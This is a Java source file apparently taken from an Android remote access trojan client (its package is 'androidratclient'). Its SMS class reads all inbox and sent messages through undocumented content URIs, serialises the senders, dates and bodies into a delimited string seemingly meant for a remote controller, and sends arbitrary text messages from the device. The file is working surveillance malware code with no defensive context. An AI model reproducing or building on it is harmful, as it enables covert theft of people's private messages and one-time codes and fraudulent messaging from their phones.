package com.dev.ah10.androidratclient;

import android.content.ContentResolver;
import android.content.Context;
import android.database.Cursor;
import android.net.Uri;
import android.telephony.SmsManager;
import android.util.Log;

class SMS
{
    private Context ctx; //The context this class will use
    //Define the undocumented column indexes
    private final int SMS_ID = 0;
    private final int SMS_THREAD = 1;
    private final int SMS_FROM = 2;
    private final int SMS_DATE = 4;
    private final int SMS_BODY = 12;
    private final int SMS_SEEN = 18;


    SMS(Context appContext) //Constructor
    {
        ctx = appContext; //Set the application context
    }

    String getSmsReceived() //List all received SMS Messages
    {
        ContentResolver cr = ctx.getContentResolver(); //Get the content resolver
        Cursor cur = cr.query( //Create a query
                Uri.parse("content://sms/inbox"), //Undocumented SMS inbox table
                null,
                null,
                null,
                null
        );

        if (cur != null && cur.getCount() > 0) //If can query, data available
        {
            StringBuilder sb = new StringBuilder();

            while (cur.moveToNext()) //Move to next row
            {
                //Get SMS data
                String id = cur.getString(SMS_ID);
                String phoneNumber = cur.getString(SMS_FROM);
                String thread = cur.getString(SMS_THREAD);
                String strDate = cur.getString(SMS_DATE);
                String message = cur.getString(SMS_BODY);
                String seen = cur.getString(SMS_SEEN);

                seen = (seen.equals("0")) ? "No" : "Yes"; //Format seen value

                //Append sms_data to the data string
                sb.append(id).append(";")
                        .append(phoneNumber).append(";")
                        .append(thread).append(";")
                        .append(strDate).append(";")
                        .append(message).append(";")
                        .append(seen).append(";")
                        .append("false").append("|");
            }

            cur.close(); //Close the query

            String result = sb.toString();
            result = result.substring(0, result.length() - 1); //Cut the last separator char

            return result;
        }
        else
        {
            Log.e("SMS", "Failed to get sms ids");
            return "sms|failed"; //Failed to get received messages
        }
    }

    String getSmsSent() //List all sent SMS Messages
    {
        ContentResolver cr = ctx.getContentResolver(); //Get the content resolver
        Cursor cur = cr.query( //Create query
                Uri.parse("content://sms/sent"), //Undocumented SMS sent table
                null,
                null,
                null,
                null
        );

        if (cur != null && cur.getCount() > 0) //If can query, data available
        {
            StringBuilder sb = new StringBuilder();

            while (cur.moveToNext()) //Move to next row
            {
                //Get SMS Data
                String id = cur.getString(SMS_ID);
                String toPhoneNumber = cur.getString(SMS_FROM);
                String thread = cur.getString(SMS_THREAD);
                String strDate = cur.getString(SMS_DATE);
                String message = cur.getString(SMS_BODY);
                String seen = cur.getString(SMS_SEEN);

                seen = (seen.equals("0")) ? "No" : "Yes"; //Format seen value

                //Append sms_data to the data string
                sb.append(id).append(";")
                        .append(toPhoneNumber).append(";")
                        .append(thread).append(";")
                        .append(strDate).append(";")
                        .append(message).append(";")
                        .append(seen).append(";")
                        .append("true").append("|");
            }

            cur.close(); //Close the query

            String result = sb.toString();
            result = result.substring(0, result.length() - 1); //Cut the last separator char

            return result;
        }
        else
        {
            return "sms-sent|failed"; //Failed to list sent sms messages
        }
    }

    void sendSms(String phoneNumber, String smsMessage) //Send an sms messages
    {
        SmsManager manager = SmsManager.getDefault(); //Get the default sms manager
        manager.sendTextMessage(phoneNumber, null, smsMessage, null, null); //Send the message
    }
}